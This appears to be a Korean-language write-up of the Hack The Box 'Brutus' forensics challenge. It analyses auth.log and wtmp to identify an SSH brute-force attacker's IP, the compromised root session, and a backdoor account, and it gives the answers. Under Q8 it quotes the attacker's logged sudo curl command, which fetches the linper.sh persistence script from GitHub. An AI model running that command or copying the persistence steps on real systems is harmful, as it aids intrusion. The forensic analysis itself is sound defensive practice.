# [endpoint] Brutus (easy)

* **Platform / Source**: hackthebox
* **Category**: endpoint/Log Analysis
* **Target File / URL**: https://app.hackthebox.com/sherlocks/Brutus

  ### Q1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
      1. 로그를 살펴보면 지속적으로 접근을 시도했지만 실패한 동일 ip address의 기록이 보임
  		-> 65.2.161.68

  ### Q2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
      1. Mar  6 06:32:44 New session 37 of user root와 그 이후 Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002 로그 기록을 발견할 수 있음
  	  2. 이걸 보면 이전과 다르게 성공 후 session에 성곡적으로 담긴 것을 확인할 수 있음
  		-> root

  ### Q3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
      1. 문제에서 친절히 wtmp artifact에서 발견 할 수 있다고 적어줌
  	  2. 하지만 UTF-8로 인코딩 되어 있어서 이를 디코딩하는 utmp.py에 %Run utmp.py D:\wtmp -o result.tsv 명령어를 사용해 분석함
  	  3. ip.addr이 65.2.161.68이고 user가 root인 접속 시간을 보면 2024-03-06 15:32:45이라고 나옴 -> 정답이 아님
  	  4. auth.log파일과 시간이 다르다는 질문의 문장에서 둘의 접속 시간을 비교하니 9시간 차이나는 것을 확인(UTC+9, 뭐지? 한국에서 파일 풀어서 그렇게 나오나? 아님 이시간대의 나라에서 해킹을 시도했나?)
  	  	-> 2024-03-06 06:32:45
		
  ### Q4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
      1. auth.log 파일을 보면 2번 문제에서 확인한 로그에 로그인 하면서 바로 설정된 것 확인할 수 있음
  		-> 37 

  ### Q5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
      1. Mar  6 06:34:18 group added to /etc/group: name=cyberjunkie, GID=1002 로그를 보면 그룹에 user한명을 추가한 것을 확인
  		-> cyberjunkie
	
  ### Q6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
      1. MITRE ATT&CK에 대해서 검색하니 사이버 공격자 행동에 대해서 번호를 붙여 구분하는 프레임워크(즉 구조)라는 것을 확인함
  	  2. 새로운 유저를 넣기도 했고 그 이유가 persistence이기에 이에 맞게 MITRE ATT&CK사이트 가서 찾으면 발견할 수 있음
  		-> T1136.001 
	  
  ### Q7. What time did the attacker's first SSH session end according to auth.log?
      1. Mar  6 06:37:24 Session 37 logged out. Waiting for processes to exit 로그를 통해 확인 가능
  		-> 2024-03-06 06:37:24
           (교차검증을 위해 wtmp파일에서도 찾아봤지만 이전 시점에 캡쳐를 한 데이터인지 나간 시간은 없없음) 
	  
  ### Q8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
      1. 명령어다 보니 command 키워드 위주로 분석하면 찾기 쉬움
      2. Mar  6 06:39:38 ip-172-31-35-28s udo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh 에서 외부에서 가져오려는 모습 확인함
  		-> /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


### 소감
1. MITRE ATT&CK이라는 공격자의 행동을 분류한 사이트가 있다는 것에 대해서 한번 쭉 봐볼 필요가 있다는 것을 느낌


        
       

